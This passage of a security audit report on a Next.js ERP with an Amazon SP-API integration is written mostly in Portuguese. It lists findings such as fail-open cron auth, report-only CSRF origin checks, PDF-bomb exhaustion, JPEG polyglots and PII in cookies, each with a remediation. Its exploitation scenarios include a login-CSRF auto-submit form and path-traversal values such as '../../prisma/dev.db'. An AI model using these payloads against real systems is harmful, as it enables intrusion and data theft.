**Remediação.** Trocar a comparacao por crypto.timingSafeEqual sobre buffers de mesmo tamanho (com guarda de comprimento), como ja feito em isInternalTokenValid no health/route.ts. Em producao, exigir CRON_SECRET sempre (ja faz). Considerar tambem nao depender de NODE_ENV para fail-open: se CRON_SECRET ausente, negar por padrao exceto em dev explicito.

**Relevância Amazon DPP.** MEDIA. Esses endpoints orquestram a coleta de dados de pedidos via SP-API. A DPP exige least-privilege e controle de acesso a operacoes que tocam dados Amazon; um bypass de autenticacao do cron (fail-open) permitiria acionar sincronizacoes nao autorizadas. O timing side-channel e secundario, mas a revisao espera comparacao constante de segredos.

**Verificação adversarial.** Both sub-issues are verified against the actual source code:

**1. Non-constant-time comparison (confirmed, low exploitability):**
`src/lib/cron-auth.ts` line 14 uses `header === \`Bearer ${secret}\`` — a plain JS equality check with short-circuit behavior. The contrast with `src/app/api/health/route.ts` lines 20-27 is explicit: the health route imports `timingSafeEqual` from `node:crypto` and even guards for length mismatch before comparison, which is the correct pattern. The cron helper does neither. Additionally, `src/app/api/amazon/reviews/cron-daily/route.ts` lines 61-72 contains a local duplicate of the same `verifyCronRequest` with the identical `===` flaw (the auditor did not flag this copy, but it exists).

For practical exploitability: the proxy rate-limits `/api/*` paths at 300 req per 15-min window per IP (proxy.ts L235 runs before the `isPublic` early-return at L269, so rate limiting IS applied). With a 32-byte hex CRON_SECRET (64-char Bearer string) and network/TLS jitter of 0.5–5ms vastly overwhelming sub-microsecond JS comparison differences, extracting the secret byt…

---

### F34 · [LOW] Camada origin-check (CSRF defense-in-depth) roda em report-only por padrao nos endpoints pre-sessao

- **Dimensão:** csrf-cors-headers · **Categoria:** CSRF / Broken Defense Configuration · **Confiança:** high
- **Severidade (auditor → verificador):** MEDIUM → LOW · **Veredito:** CONFIRMED
- **Local:** `src/lib/origin-check.ts:54-91`

**Descrição.** originViolationResponse() so retorna 403 quando enforceEnabled() (CSRF_ENFORCE_ORIGIN==='true'); caso contrario apenas loga um warn e deixa passar (linha 79-90). Esse helper e a UNICA validacao CSRF dos endpoints PRE-SESSAO (/api/auth/login usa originViolationResponse na linha 38-39; recuperar/redefinir-senha/2fa seguem o mesmo padrao). Como esses paths estao em PUBLIC_PATHS do proxy, o isSameOriginMutation do proxy NAO os cobre (isPublic retorna antes, proxy.ts linha 269). Resultado: na configuracao default (CSRF_ENFORCE_ORIGIN ausente — nem listado no .env.example), nao ha NENHUM bloqueio de Origin nesses endpoints; a defesa fica 100% dependente de sameSite=lax, que nao protege fluxos pre-sessao (login CSRF) onde ainda nao existe cookie. Adicionalmente, checkRequestOrigin e fail-open quando Origin ausente (linha 56) e quando APP_URL ausente (linha 59).

**Cenário de exploração.** Login CSRF: atacante hospeda pagina com form POST auto-submit para /api/auth/login com credenciais de uma conta controlada pelo atacante. Vitima visita a pagina; como nao ha cookie de sessao ainda e sameSite=lax nao se aplica a um POST cross-site sem cookie, e o origin-check esta em report-only (default), o login e aceito e a vitima fica autenticada na conta do atacante (session fixation), podendo ter PII/dados envenenados ou acoes atribuidas. O proprio comentario do arquivo (linha 9-11) declara que esta camada existe justamente para os endpoints pre-sessao — mas ela esta desligada por default.

**Remediação.** Ligar CSRF_ENFORCE_ORIGIN=true em producao por padrao (ou inverter a logica: enforce a menos que CSRF_REPORT_ONLY=true), documentar a var no .env.example, e garantir APP_URL/TRUSTED_ORIGINS configurados em prod. Considerar tambem exigir Origin presente (fail-closed) em endpoints de auth pre-sessao, ja que navegadores legitimos sempre enviam Origin em POST cross-site.

**Relevância Amazon DPP.** MEDIA. Login CSRF / session fixation e item recorrente em revisao de seguranca; controle CSRF efetivo (nao apenas report-only) e esperado. Impacta confianca no isolamento de contas de sellers.

**Verificação adversarial.** A vulnerabilidade de configuracao e real e confirmada pelo codigo, mas a severidade declarada (MEDIUM) esta superestimada porque o auditor nao considerou a mitigacao efetiva do CORS + requisito JSON.

**O que e confirmado:**

1. `origin-check.ts` linhas 64-90: `enforceEnabled()` so retorna `true` com `CSRF_ENFORCE_ORIGIN==='true'`; sem ela, `originViolationResponse` sempre retorna `null` independente do Origin recebido.

2. `proxy.ts` linha 269: PUBLIC_PATHS (incluindo `/api/auth/login`, `/api/auth/recuperar-senha`, `/api/auth/redefinir-senha`) saem antes da verificacao `isSameOriginMutation` na linha 271 — a defesa same-origin do proxy nao cobre esses endpoints.

3. `.env.example`: `CSRF_ENFORCE_ORIGIN` nao esta documentado — operadores que seguirem o exemplo de referencia nao saberao que a defesa existe mas esta desligada.

4. `checkRequestOrigin` e fail-open quando Origin ausente (linha 56) e quando APP_URL nao configura allowlist (linha 59) — confirmado.

**Por que o cenario de exploracao nao e viavel como descrito (downgrade de severidade):**

O auditor descreve um ataque de Log…

---

### F35 · [LOW] Proxy permite mutacao quando header Origin ausente (fail-open) — defesa depende so de sameSite=lax

- **Dimensão:** csrf-cors-headers · **Categoria:** CSRF · **Confiança:** medium
- **Severidade (auditor → verificador):** LOW → LOW · **Veredito:** CONFIRMED
- **Local:** `src/proxy.ts:179-196`

**Descrição.** isSameOriginMutation() retorna true (permite) quando o header Origin esta ausente (linha 182-183). Isso e fail-open por design e o comentario do origin-check argumenta que sameSite=lax cobre o caso de navegador. A analise confirma que, para um navegador moderno, requisicoes mutantes (POST/PUT/PATCH/DELETE) cross-site SEMPRE enviam Origin, e o cookie sameSite=lax nao acompanha POST cross-site — logo nao ha bypass pratico de CSRF autenticado a partir de um navegador. Reporto como LOW porque (a) e fail-open explicito que reduz defesa-em-profundidade e (b) a comparacao usa o proprio header Host da request (linha 194) como referencia de origem confiavel: se o deploy nao fixar Host (ex: ausencia de proxy_set_header Host $host ou trust em X-Forwarded-Host), um atacante poderia casar Origin forjado com Host forjado. Atras do Nginx atual (Host=$host) nao e explorável.

**Cenário de exploração.** Pre-condicao improvável em prod: cliente nao-navegador (curl) consegue omitir Origin, mas nao possui o cookie sameSite da vitima, entao nao ha CSRF. O risco real e regressao de configuracao: se um futuro deploy passar a confiar em X-Forwarded-Host ou remover a fixacao de Host no Nginx, a comparacao Origin.host === Host.host passa a aceitar Host controlado pelo atacante, neutralizando a checagem same-origin.

**Remediação.** Validar Origin/Host contra uma allowlist fixa (APP_URL/TRUSTED_ORIGINS) em vez do header Host da propria request, tornando a checagem independente de configuracao de proxy. Opcionalmente, exigir Origin presente para mutacoes de rotas autenticadas. Documentar que o Nginx DEVE setar Host=$host e nunca confiar em X-Forwarded-Host.

**Relevância Amazon DPP.** BAIXA. Sem exploit pratico no deploy atual; e robustez/defense-in-depth. Mencionar como controle CSRF baseado em allowlist fixa fortalece a postura no questionario.

**Verificação adversarial.** A leitura direta dos arquivos confirma os fatos alegados, mas com severidade mantida em LOW — não há elevação justificada.

**O que o código faz (confirmado):**
- `isSameOriginMutation` em `src/proxy.ts` linhas 182-183: `if (!origin) return true` — fail-open explícito quando Origin está ausente.
- Cookie de sessão em `src/lib/session.ts` linha 119: `sameSite: "lax"` — confirma que POST/PUT/PATCH/DELETE cross-site de navegador não carrega o cookie.
- Anchor de confiança em `src/proxy.ts` linha 194: `req.headers.get("host") ?? req.nextUrl.host` — usa o header Host recebido pelo Edge runtime, não uma allowlist fixa.

**Sobre o Nginx (achado do auditor parcialmente correto):**
- `deploy/nginx-erp.conf` linha 80: `proxy_set_header Host $host;` — a variável `$host` no Nginx é o nome do servidor (`server_name SEU_DOMINIO`), não o Host bruto do cliente. O Nginx sobrescreve o Host antes de passar ao app, portanto o valor que chega ao `req.headers.get("host")` no proxy.ts é sempre o hostname canônico do servidor, não controlado pelo atacante.
- O arquivo Nginx NÃO inclui `proxy_set_header X-Fo…

---

### F36 · [LOW] Cron/worker endpoints publicos ficam totalmente abertos quando CRON_SECRET ausente em ambiente nao-producao

- **Dimensão:** csrf-cors-headers · **Categoria:** Broken Authentication / Misconfiguration · **Confiança:** medium
- **Severidade (auditor → verificador):** LOW → LOW · **Veredito:** CONFIRMED
- **Local:** `src/lib/cron-auth.ts:7-15`

**Descrição.** verifyCronRequest() faz fail-OPEN (retorna ok:true sem checar nenhum header) quando CRON_SECRET nao esta configurado E NODE_ENV !== 'production' (linha 8-10). Os endpoints cron-orders/cron-inventory/cron-finances/reviews/cron-daily/worker estao em PUBLIC_PATHS (proxy.ts linha 25-29), entao nesse cenario qualquer requisicao anonima pode enfileirar jobs SP-API e disparar o worker. Em producao com secret ausente faz fail-closed (correto). O risco e ambiente de staging/preview (NODE_ENV != production) acessivel na internet sem CRON_SECRET: trigger anonimo de sync/worker (DoS de quota Amazon, custo, ruido). reviews/cron-daily ainda duplica essa funcao localmente (route.ts linha 61-72).

**Cenário de exploração.** Atacante descobre URL de staging publico (ex: preview deploy) sem CRON_SECRET. Faz GET repetido em /api/amazon/worker e /api/amazon/cron-finances, enfileirando e processando jobs SP-API anonimamente, esgotando quota da Amazon (PRODUCT_FEES/Finances) e gerando carga/custo, alem de potencial trigger de envio de reviews solicitations.

**Remediação.** Tornar fail-closed tambem fora de producao quando o endpoint estiver exposto, ou nunca expor staging publicamente sem CRON_SECRET. Idealmente exigir CRON_SECRET sempre que os paths estiverem em PUBLIC_PATHS, independente de NODE_ENV. Remover a copia duplicada de verifyCronRequest em reviews/cron-daily e usar a de cron-auth.ts.

**Relevância Amazon DPP.** BAIXA-MEDIA. Trigger anonimo de chamadas SP-API em ambiente exposto pode violar termos de uso/least-privilege e gerar acesso descontrolado a PII de pedido durante o sync. Em producao o controle esta correto.

**Verificação adversarial.** All three claims are supported by direct code reading:

1. FAIL-OPEN LOGIC CONFIRMED. src/lib/cron-auth.ts lines 8-9: when CRON_SECRET is absent and NODE_ENV !== "production", verifyCronRequest() returns { ok: true } unconditionally — no header is inspected. This is the textbook fail-open pattern.

2. PUBLIC_PATHS EXPOSURE CONFIRMED. src/proxy.ts lines 25-29 list all five endpoints (/api/amazon/cron-orders, cron-inventory, cron-finances, reviews/cron-daily, worker) in PUBLIC_PATHS. The middleware exits early at line 269 (isPublic check) before any session verification, so the ONLY guard on these routes is the verifyCronRequest() call inside each handler. There is no secondary auth layer between the internet and these handlers when the fail-open condition is met.

3. DUPLICATE verifyCronRequest CONFIRMED. src/app/api/amazon/reviews/cron-daily/route.ts lines 61-72 contain an inlined private copy of verifyCronRequest, logically identical to the shared one in cron-auth.ts. The other three routes (cron-orders, cron-inventory, cron-finances, worker) correctly import from @/lib/cron-auth. T…

---

### F37 · [LOW] Parse de PDF arbitrario via @libpdf e reenvio integral ao OpenAI sem cap de paginas

- **Dimensão:** file-upload · **Categoria:** Denial of Service / Resource Exhaustion · **Confiança:** medium
- **Severidade (auditor → verificador):** MEDIUM → LOW · **Veredito:** CONFIRMED
- **Local:** `src/modules/documentos-financeiros/service.ts:607-626 (extrairTextoPdfComSenha: PDF.load + extractText em todas as paginas) e 639-667 (buffer inteiro para base64 e enviado como input_file ao OpenAI)`

**Descrição.** processarUpload aceita PDFs ate 15MB e os entrega a PDF.load() do @libpdf/core (extractText em TODAS as paginas) ou converte o buffer inteiro para base64 e o injeta em client.responses.create do OpenAI. Nao ha limite de numero de paginas/objetos do PDF, nem de tamanho do texto antes do slice(45000) (o slice e aplicado DEPOIS de extrair tudo). Um PDF malicioso com milhares de paginas/objetos comprimidos (PDF bomb) ou estruturas profundamente aninhadas pode consumir CPU/memoria excessiva no extractText, e o reenvio do base64 de 15MB gera custo/latencia no OpenAI controlavel pelo atacante. O mesmo vale para /api/contas/nf-extract (10MB).

**Cenário de exploração.** 1. Usuario FINANCEIRO autenticado faz upload de um PDF 'bomba' (objetos/paginas explosivos dentro de 15MB) em POST /api/documentos-financeiros. 2. extrairTextoPdfComSenha/PDF.load expande a estrutura em memoria/CPU; ou o base64 de 15MB e enviado repetidamente ao OpenAI. 3. Repeticao causa degradacao/OOM do processo e/ou custo financeiro descontrolado na conta OpenAI.

**Remediação.** Antes de extrair/enviar: validar contagem de paginas (ex. limite 50) e abortar PDFs maiores; aplicar timeout no PDF.load/extractText; limitar o tamanho do PDF efetivamente enviado ao OpenAI e/ou extrair texto localmente e enviar apenas o texto (ja truncado) em vez do PDF inteiro; adicionar circuit-breaker/quota de chamadas OpenAI por usuario para conter abuso de custo.

**Relevância Amazon DPP.** Indireto (resiliencia/abuse-prevention). Sem impacto direto em PII, mas reforca lacuna de protecao contra abuso de recursos avaliada no questionario de seguranca.

**Verificação adversarial.** The finding is confirmed with two concrete, verified attack surfaces in real code.

SURFACE 1 — `extrairTextoPdfComSenha` (service.ts L607-626): `PDF.load(buffer)` followed by `pdf.extractText().map(page => page.text).join(...)` iterates every page in memory before any page-count gate. The `.slice(0, 45000)` truncation only fires AFTER the full extraction — a PDF bomb that expands to hundreds of megabytes of text in-process is not stopped before that expansion occurs.

SURFACE 2 — Unprotected-PDF path and `/api/contas/nf-extract` (route.ts L83-127): the entire buffer (up to 15 MB / 10 MB respectively) is converted to base64 and sent inline as `input_file` to GPT-4o via `client.responses.create`. No page-count check precedes this call, so a dense 15 MB PDF triggers a costly OpenAI inference round trip on every unique upload.

MITIGATIONS PRESENT (partially reduce severity):
- `requireRole(FINANCEIRO)` at both endpoints: unauthenticated attackers cannot exploit this; it requires a valid session with at least FINANCEIRO role.
- SHA256 deduplication (service.ts L1022-1033): exact-duplica…

---

### F38 · [LOW] Validacao de assinatura JPEG so checa SOI/EOI, permitindo polyglots

- **Dimensão:** file-upload · **Categoria:** Improper Input Validation · **Confiança:** high
- **Severidade (auditor → verificador):** LOW → LOW · **Veredito:** CONFIRMED
- **Local:** `src/lib/file-validation.ts:12-19 (detectMimeFromBytes ramo image/jpeg)`

**Descrição.** A deteccao de JPEG aceita qualquer buffer cujos 2 primeiros bytes sejam FF D8 e cujos 2 ultimos bytes sejam FF D9, sem validar os marcadores intermediarios (APPn/SOF/DHT). E trivial construir um arquivo polyglot que satisfaz FF D8 ... FF D9 mas cujo miolo contem outro payload (ex. HTML/JS, ou um ZIP). Como os uploads de imagem (avatar, produto) e os anexos de NF passam por fileMatchesDeclaredMime declarando image/jpeg, um polyglot e aceito e gravado. O impacto e contido HOJE porque (a) o serving de imagem forca Content-Type por EXTENSAO do arquivo salvo (image/jpeg) e nosniff impede o browser de reinterpretar, e (b) o conteudo nao e executado. Mas a validacao 'magic bytes' transmite uma garantia que nao se sustenta para JPEG.

**Cenário de exploração.** 1. Atacante cria arquivo iniciando com FF D8 e terminando com FF D9, contendo dados arbitrarios no meio. 2. Faz upload como image/jpeg em /api/perfil/avatar ou /api/produtos/[id]/imagem. 3. fileMatchesDeclaredMime retorna true e o arquivo e persistido como .jpg. Sozinho nao executa nada (mitigado por Content-Type por extensao + nosniff), mas a 'validacao por conteudo' nao oferece a protecao implicita esperada se algum consumidor futuro confiar nela.

**Remediação.** Validar marcadores JPEG alem de SOI/EOI (verificar APP0/APP1 logo apos SOI e/ou presenca de SOF), ou usar uma lib de deteccao robusta (ex. file-type) que parseia a estrutura. Manter sempre o serving por Content-Type derivado da extensao validada + nosniff (ja feito) como defesa em profundidade.

**Relevância Amazon DPP.** Baixo/indireto. Higiene de validacao de input; nao e por si so um vazamento de PII nem RCE, mas integra a avaliacao de robustez de manuseio de uploads.

**Verificação adversarial.** The code weakness is real and confirmed in src/lib/file-validation.ts lines 12-19: the JPEG branch only validates the SOI marker (FF D8 at offset 0) and EOI marker (FF D9 at the last two bytes), with no validation of intermediate JPEG structure (APP0/APP1, SOF, DHT markers). A polyglot file trivially satisfies this check.

However, all the mitigations the auditor cited are independently verified to be in place and effective:

1. Content-Type derivation from extension: both GET handlers in /api/perfil/avatar/route.ts (lines 103-105) and /api/produtos/[id]/imagem/route.ts (lines 122-128) derive Content-Type exclusively from the file extension on disk, which is server-controlled (fixed to 'jpg', 'png', or 'webp' from the ALLOWED_MIMES map — user cannot influence the saved extension).

2. X-Content-Type-Options: nosniff: confirmed set in proxy.ts line 132 via withSecurityHeaders(), applied to all API responses. The uploaded files are served through API route handlers (/api/...) which go through the middleware, not through the static file shortcut in the proxy matcher (which only bypasses…

---

### F39 · [LOW] Caminho de anexo de NF (nfAnexo) e string arbitraria controlada pelo cliente e persistida

- **Dimensão:** file-upload · **Categoria:** Improper Input Validation / Insecure Design · **Confiança:** medium
- **Severidade (auditor → verificador):** LOW → LOW · **Veredito:** CONFIRMED
- **Local:** `src/modules/contas-a-pagar/schemas.ts:14 (nfAnexo: z.string().optional()) — consumido em src/app/api/contas/route.ts e persistido via service.ts L306`

**Descrição.** /api/contas/nf-extract grava o arquivo em uploads/nf/<gerado>.ext e devolve nfAnexoPath ao cliente. Ao criar a conta (POST /api/contas), o cliente reenvia nfAnexo como string livre (z.string(), sem validacao de prefixo/formato) que e persistida em ContaPagar.nfAnexo. Nao encontrei na auditoria um endpoint que LEIA esse caminho do disco (nenhum GET de anexo de conta), portanto nao ha sink de path traversal explotavel hoje. Porem o valor e atacante-controlavel e poderia ser apontado para fora de uploads/ (ex. ../../prisma/dev.db) caso um servidor de anexos seja adicionado no futuro sem revalidar o caminho.

**Cenário de exploração.** 1. Usuario FINANCEIRO cria conta enviando nfAnexo='../../algum/arquivo-sensivel'. 2. Hoje isso so polui o registro (sem leitura). 3. Se posteriormente alguem implementar GET /api/contas/[id]/anexo lendo ContaPagar.nfAnexo diretamente sem validar startsWith(uploads/), vira leitura arbitraria de arquivos do servidor.

**Remediação.** Nao confiar no caminho devolvido pelo cliente: amarrar nfAnexo ao registro no servidor (gerar/derivar do id da conta) ou validar com regex estrita (^uploads/nf/[A-Za-z0-9._-]+$) tanto na criacao quanto em qualquer leitura futura, e sempre resolver+validar startsWith(uploads/) ao servir.

**Relevância Amazon DPP.** Baixo/indireto enquanto nao houver sink de leitura. Documenta divida de design que poderia evoluir para leitura arbitraria de segredos/PII, o que seria bloqueador na DPP se ativado.

**Verificação adversarial.** The vulnerability is real and the code evidence is solid, but the auditor's own description already acknowledges there is no current exploitable sink — making this a latent/design issue, not an active exploit.

Evidence verified:

1. `src/modules/contas-a-pagar/schemas.ts:14` — `nfAnexo: z.string().optional()` with zero format/prefix constraints. Confirmed.

2. `src/app/api/contas/route.ts:39` — `POST /api/contas` passes raw `body` directly to `contasService.criar(body)`, which calls `criarContaSchema.parse(input)` and persists `nfAnexo` verbatim at `service.ts:306`. An authenticated ADMIN/FINANCEIRO user can send `nfAnexo: "../../prisma/dev.db"` and it will be stored in `ContaPagar.nfAnexo` in the database.

3. `src/app/api/contas/[id]/route.ts:12` — `PATCH` calls `contasService.anexarDocumento()` which also trims but does not validate the path prefix (service.ts:378–386), so the same injection is possible through the update path.

4. There is **no current endpoint that reads `ContaPagar.nfAnexo` from the database and serves the file**. The three file-serving endpoints that do exist…

---

### F40 · [LOW] Extensao de arquivo de upload nao sanitizada ao montar nome em disco (nf-extract)

- **Dimensão:** injection · **Categoria:** Path Traversal / Improper Input Validation · **Confiança:** high
- **Severidade (auditor → verificador):** LOW → LOW · **Veredito:** CONFIRMED
- **Local:** `src/app/api/contas/nf-extract/route.ts:90-94`

**Descrição.** Ao persistir o anexo da NF, a extensao e derivada de arquivo.name sem sanitizacao: `const ext = arquivo.name.split('.').pop() ?? 'bin'; const filename = `${Date.now()}-${Math.random()...}.${ext}`; const filePath = path.join(uploadDir, filename);`. Diferente de salvarArquivo() em src/modules/documentos-financeiros/service.ts:737 (que faz `.replace(/[^a-zA-Z0-9]/g, '')`), aqui o segmento pos-ultimo-ponto do nome do arquivo (controlavel pelo cliente no multipart) entra cru no nome do arquivo gravado. NAO e um path traversal para fora de uploads/ explorável: como split usa '.' como delimitador, qualquer sequencia '..' do payload (que contem '.') e fragmentada e nunca sobrevive na extensao popped; o pior caso e gravar em um subdiretorio inexistente dentro de uploads/nf/ (ex: ext='/tmp/x' vira uploads/nf/<rand>./tmp/x), cujo mkdir do diretorio intermediario nao ocorre, fazendo o writeFile falhar (e o catch trata como nfAnexoPath=null, sem bloquear). Logo o impacto e robustez/higiene, nao escrita arbitraria.

**Cenário de exploração.** Um usuario com role ADMIN/FINANCEIRO (a rota e requireRole(ADMIN, FINANCEIRO)) envia multipart com filename contendo separadores, ex: 'x.pdf/foo/bar'. O ext resultante carrega o separador; a gravacao tenta path.join(uploads/nf, '<rand>.foo/bar') e falha silenciosamente (catch -> nfAnexoPath null). Nao ha escrita fora de uploads/ porque os '..' nao sobrevivem ao split('.'). Sem RCE, sem overwrite de arquivo arbitrario.

**Remediação.** Aplicar a mesma sanitizacao usada em documentos-financeiros: `const ext = (arquivo.name.split('.').pop() || 'bin').replace(/[^a-zA-Z0-9]/g, '').slice(0,8) || 'bin';` e/ou derivar a extensao a partir do MIME validado (mimeType) em vez do nome do arquivo. Adicionar tambem o guard resolved.startsWith(uploadDir + path.sep) por defesa em profundidade.

**Relevância Amazon DPP.** Baixa. Nao envolve PII de comprador nem credenciais OAuth. A Amazon DPP foca em criptografia de PII/segredos, retencao/exclusao e isolamento de tenant; este item e higiene de upload e nao deve ser bloqueador. Recomenda-se corrigir por consistencia com o restante do codigo (que ja sanitiza) e para nao gerar achados em questionario de seguranca.

**Verificação adversarial.** The code at lines 90-94 of src/app/api/contas/nf-extract/route.ts does exactly what the auditor describes: `const ext = arquivo.name.split(".").pop() ?? "bin"` extracts the last dot-separated segment of the original filename with no sanitization, unlike the sibling function `salvarArquivo()` in src/modules/documentos-financeiros/service.ts:737 which applies `.replace(/[^a-zA-Z0-9]/g, "")`.

The auditor's exploit-path analysis is correct and conservative:
- `split(".")` uses `.` as delimiter, so any `..` sequences in the filename are fragmented and never survive into `ext`. Classic path traversal via `../../` is not possible via this vector.
- A filename like `x.pdf/foo/bar` results in `ext = "bar"` (last element after splitting on `.`). `path.join(uploadDir, filename)` with that ext stays inside `uploads/nf/`.
- The `catch` block at line 95 silently swallows any `writeFile` failure (e.g., if the constructed path has a non-existent intermediate directory) and falls back to `nfAnexoPath = null`, so the extraction flow is unaffected.
- The uploads directory is at `process.cwd()/uploads/…

---

### F41 · [LOW] PII (email e nome) trafega no cookie de sessão apenas em base64 (assinado, NÃO cifrado)

- **Dimensão:** pii-logging-exposure · **Categoria:** Sensitive Data Exposure / Cleartext Storage of Sensitive Information · **Confiança:** high
- **Severidade (auditor → verificador):** MEDIUM → LOW · **Veredito:** CONFIRMED
- **Local:** `src/lib/session.ts:9-25, 67-73`

**Descrição.** SessionPayload inclui email e nome do usuário. signSession serializa o payload com JSON.stringify e codifica em base64url (b64urlEncode), anexando apenas uma assinatura HMAC-SHA256. Não há cifragem do payload — a assinatura garante integridade/autenticidade, mas qualquer um que obtenha o valor do cookie consegue decodificar email e nome com um atob trivial. O cookie é httpOnly e (em prod) secure, o que mitiga roubo via JS/rede, mas o conteúdo continua sendo PII em claro no token.

**Cenário de exploração.** Um cookie de sessão capturado (ex.: backup de navegador, log que registre headers de cookie por engano, ferramenta de suporte, dump de proxy) revela imediatamente email+nome do usuário ao ser base64-decodificado, sem necessidade da SESSION_SECRET. Não permite forjar sessão (HMAC protege), mas vaza PII desnecessariamente — viola minimização: o servidor poderia carregar email/nome do banco a partir do uid.

**Remediação.** Remover email e nome do payload do cookie, mantendo apenas uid (e role/v/empresaId/exp). Buscar email/nome do banco quando necessário (getSession já consulta Usuario para validar sessionVersion). Alternativamente, cifrar o payload (AES-256-GCM, já disponível em src/lib/crypto.ts) em vez de só assinar.

**Relevância Amazon DPP.** MÉDIA. PII de COMPRADOR não está no cookie (é PII do operador/seller). A DPP foca em PII do comprador, mas o princípio de minimização de dados e cifragem de dados pessoais em trânsito/repouso é avaliado de forma ampla; reduzir PII no token é hardening alinhado ao questionário.

**Verificação adversarial.** Leitura direta dos arquivos confirmou todos os fatos técnicos alegados. Em session.ts linhas 9-25, SessionPayload declara os campos `email` e `nome`. Em signSession (linhas 67-73), o payload é serializado com JSON.stringify e codificado em base64url — sem cifragem. Qualquer portador do valor do cookie pode decodificar o primeiro segmento com atob/base64url decode e ler email+nome em plaintext. Isso foi confirmado também no handler de login (api/auth/login/route.ts linhas 153-161) que preenche explicitamente email e nome no payload assinado.

Porém, o auditor superestima a severidade. As mitigações existentes são substanciais e corretas:
- Cookie é httpOnly=true (sem acesso JS, bloqueia XSS direto).
- Cookie é secure=true em produção (não trafega sem TLS).
- sameSite=lax (proteção CSRF lateral).
- O logger.ts (linhas 38-39) redacta `headers.cookie` e `req.headers.cookie`, então o valor não aparece em logs estruturados.
- Não há evidência de logging de raw cookie values no codebase.
- O vetor de exploração descrito (captura de cookie via backup de browser, dump de proxy, ferramenta de …

---

### F42 · [LOW] GET /api/health expõe mensagem crua de erro do banco a chamadores não autenticados

- **Dimensão:** pii-logging-exposure · **Categoria:** Sensitive Data Exposure / Information Exposure Through Error Message · **Confiança:** high
- **Severidade (auditor → verificador):** LOW → LOW · **Veredito:** CONFIRMED
- **Local:** `src/app/api/health/route.ts:32-50`

**Descrição.** O check de DB faz db.$queryRaw e, no catch, captura e.message; quando o banco está indisponível, o endpoint retorna 503 com { db: { ok:false, error: <mensagem crua> } } ANTES de qualquer verificação de autenticação/role (a checagem canSeeDetails só ocorre depois, L106-118). A mensagem de erro do Prisma/Postgres pode revelar host, nome do banco, usuário ou detalhes de conexão. Para o caminho de sucesso o detalhamento é corretamente gateado por ADMIN/token interno, mas o caminho de falha de DB vaza o erro a qualquer um.

**Cenário de exploração.** Atacante não autenticado faz GET /api/health durante uma janela de indisponibilidade do banco e obtém a mensagem de erro do driver Postgres, potencialmente expondo host/porta/database/usuário usados na DATABASE_URL — útil para reconhecimento da infraestrutura.

**Remediação.** No ramo de falha de DB, retornar um corpo genérico (ex.: { ok:false, db:{ok:false} }) sem o campo error quando o chamador não for ADMIN/token interno. Mover o cálculo de canSeeDetails para antes do retorno 503, ou simplesmente nunca expor e.message a não-admins.

**Relevância Amazon DPP.** BAIXA. Não vaza PII de comprador, mas mensagens de erro detalhadas a não autenticados contrariam as boas práticas de tratamento de erros que a Amazon avalia (não revelar detalhes internos do sistema).

**Verificação adversarial.** Leitura direta de src/app/api/health/route.ts confirma o achado sem nenhuma mitigação ignorada:

1. Linhas 32-37: o catch de `db.$queryRaw` captura `e.message` e preenche `dbCheck.error` com a mensagem crua do driver.

2. Linhas 40-50: retorno 503 imediato com `{ ok:false, db: dbCheck, version, elapsedMs }`. Como `dbCheck` é `{ ok:false, error: "<mensagem crua>" }`, o campo `error` vai no corpo sem qualquer filtragem.

3. Linhas 106-118: o cálculo de `canSeeDetails` e o retorno resumido para não-admins só ocorrem DEPOIS do early-return acima. No caminho de falha de DB esse gate nunca é atingido.

4. src/proxy.ts linha 24: `/api/health` está explicitamente em `PUBLIC_PATHS`, portanto o middleware não exige sessão — qualquer cliente não autenticado atinge o handler.

5. Não existe middleware.ts separado; o proxy.ts é o único middleware de borda, e ele bypassa autenticação para essa rota.

A mensagem de erro do Prisma para falha de conexão Postgres tipicamente contém host, porta, nome do banco e usuário (componentes da DATABASE_URL), tornando o vazamento concreto para reconhecimento de …

---

### F43 · [LOW] AmazonOrderRaw.payloadJson armazena o pedido cru sem cifragem em repouso (risco latente de PII de comprador)

- **Dimensão:** pii-logging-exposure · **Categoria:** Sensitive Data Exposure / Missing Encryption of Sensitive Data · **Confiança:** medium
- **Severidade (auditor → verificador):** LOW → LOW · **Veredito:** CONFIRMED
- **Local:** `prisma/schema.postgresql.prisma:569-589`

**Descrição.** AmazonOrderRaw.payloadJson (String) recebe o objeto SPOrder serializado inteiro via upsertAmazonOrderRaw (src/modules/amazon/service.ts L1470-1500, payloadJson: asJson(order)). Hoje getOrders/getOrder (src/lib/amazon-sp-api.ts L813-909) NÃO solicitam BuyerInfo nem ShippingAddress, então o blob atual não contém PII de comprador (verifiquei orderDateParams L1076 e a interface SPOrder L54-70). Contudo, é um blob não cifrado em repouso, sem TTL/retenção: se um futuro ajuste passar a pedir dados de comprador (nome/endereço/telefone) — comum quando se precisa de fulfillment FBM — a PII passaria a persistir indefinidamente em claro. Não há mecanismo de retenção/expurgo (não vi job de deleção pós-30d para dados de pedido).

**Cenário de exploração.** Latente: assim que o time habilitar BuyerInfo na chamada de Orders (ou armazenar payloads de notificação SQS que incluam endereço), o payloadJson passa a guardar PII de comprador em texto claro e sem expurgo, violando a regra de retenção de 30 dias pós-entrega da DPP. Um dump do Postgres ou acesso ao banco exporia toda a base de PII de pedidos.

**Remediação.** Tratar payloadJson como dado potencialmente sensível: cifrar em repouso (AES-256-GCM via src/lib/crypto.ts) OU armazenar apenas os campos estritamente necessários (já normalizados nos campos tipados). Implementar job de retenção que apague/anonimize payloadJson de pedidos com entrega > 30 dias (salvo retenção fiscal). Documentar explicitamente que BuyerInfo não é solicitado e adicionar teste que falhe se o parâmetro for adicionado sem cifragem/retenção.

**Relevância Amazon DPP.** ALTA (preventiva). A DPP cobra com rigor: cifragem em repouso de PII de comprador, retenção máxima de 30 dias pós-entrega e mecanismo de deleção. Mesmo que hoje não haja PII no blob, a ausência de cifragem + ausência de política de retenção neste modelo é exatamente o tipo de gap que o questionário de segurança Amazon aponta antes de aprovar multi-seller.

**Verificação adversarial.** The finding is structurally accurate and I confirmed each claim independently:

1. AmazonOrderRaw.payloadJson (schema.postgresql.prisma line 559) is a plain `Json` field with no encryption layer. Confirmed.

2. upsertAmazonOrderRaw (service.ts L1484) stores `asJson(order) ?? "{}"` — the full raw JavaScript object from the SP-API response. `asJson` is simply `JSON.stringify(value)` (service.ts L98-100). There is no field allowlist or PII stripping before persistence.

3. The SP-API client's `parseResponse` (amazon-sp-api.ts L1129-1138) returns `JSON.parse(text)` as `unknown`, which is then cast to `SPOrder` via `readOrdersFromResponse`. TypeScript interfaces do not strip extra JSON keys at runtime. If Amazon's endpoint ever returns additional fields (BuyerEmail, ShippingAddress, etc.) — even without explicit request parameters — those fields would survive the cast and be captured by `asJson`.

